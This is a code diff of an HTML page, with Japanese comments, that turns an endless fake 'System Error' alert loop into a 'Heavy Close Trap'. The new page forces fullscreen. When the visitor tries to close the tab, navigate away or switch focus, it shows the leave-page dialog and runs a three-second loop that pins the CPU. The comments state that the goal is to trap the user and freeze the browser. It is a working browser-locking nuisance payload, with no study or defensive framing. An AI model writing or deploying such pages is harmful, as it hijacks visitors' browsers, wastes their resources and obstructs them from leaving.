@@ -2,12 +2,12 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>Alert Loop Test</title>
+    <title>Heavy Close Trap</title>
     <style>
         body {
             margin: 0;
-            background-color: #000;
-            color: #0ff;
+            background-color: #111;
+            color: #ff4444;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -17,31 +17,47 @@
             user-select: none;
         }
         h1 {
-            font-size: 3rem;
-            text-shadow: 0 0 10px #0ff;
+            font-size: 2.5rem;
+            text-align: center;
+            text-shadow: 0 0 10px #ff0000;
         }
     </style>
 </head>
 <body>
 
-    <h1>CLICK TO START</h1>
+    <h1>CLICK TO INITIALIZE</h1>
 
     <script>
+        // メインスレッドを完全にブロックしつつCPUを焼き切る重い処理（Web Workerを使わない直ガリ勉タスク）
+        function spawnHeavyLoad() {
+            const startTime = performance.now();
+            // 約3秒間、CPUを100%近くに張り付かせてメインスレッドを完全に沈黙させる
+            while (performance.now() - startTime < 3000) {
+                Math.pow(Math.random(), Math.random()) * Math.sin(Math.random());
+            }
+        }
+
         document.body.addEventListener('click', async () => {
             try {
-                // フルスクリーン化を試みる
                 await document.documentElement.requestFullscreen();
-            } catch (err) {
-                console.log(err);
-            }
+            } catch (err) {}
 
-            // メインスレッドの制御権を完全に奪い去る無限アラートの罠
-            // ブラウザや環境によっては「このページがこれ以上ダイアログを表示するのを防ぐ」にチェックを入れないと地獄になります
-            let count = 1;
-            while (true) {
-                alert(`System Error #${count}: Escキーが無効化されました。`);
-                count++;
-            }
+            document.querySelector('h1').innerText = "TRAP ARMED.\nTry to close this tab.";
+        });
+
+        // ユーザーがタブを閉じようとしたり、フォーカスを外したり、ナビゲーションしようとした瞬間を検知
+        window.addEventListener('beforeunload', (e) => {
+            // ブラウザ標準の「本当に移動しますか？」ダイアログを出す
+            e.preventDefault();
+            e.returnValue = '';
+
+            // 閉じる・離脱の意志を見せた瞬間に激重処理をブチ込む
+            spawnHeavyLoad();
+        });
+
+        // 画面からフォーカスが外れた（タブを切り替えようとしたり、他のウィンドウを選んだ）瞬間を検知
+        window.addEventListener('blur', () => {
+            spawnHeavyLoad();
         });
     </script>
 
